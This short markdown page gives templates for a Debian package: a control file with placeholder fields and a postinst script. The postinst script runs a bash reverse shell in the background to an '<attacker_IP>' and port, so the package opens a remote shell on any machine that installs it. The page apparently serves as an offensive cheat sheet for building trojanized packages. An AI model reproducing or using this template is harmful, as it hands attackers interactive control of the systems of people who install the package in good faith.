# Package File Templates

## DEB

The `control` text file.

```
Package: <package_name>
Architecture: <i386 | amd64>
Version: <version>
Priority: <required | optional>
Section: <utils | universe/games>
Origin: <Debian | Ubuntu>
Maintainer: <maintainer_name> <username@email.com>
Original-Maintainer: <maintainer_name> <username@email.com>
Description: <short_description>
<long_description>
```

The post-installation script (`postinst`).

```
#!/bin/sh
bash -c 'bash -i >& /dev/tcp/<attacker_IP>/<attacker_PORT> 0>&1' &
```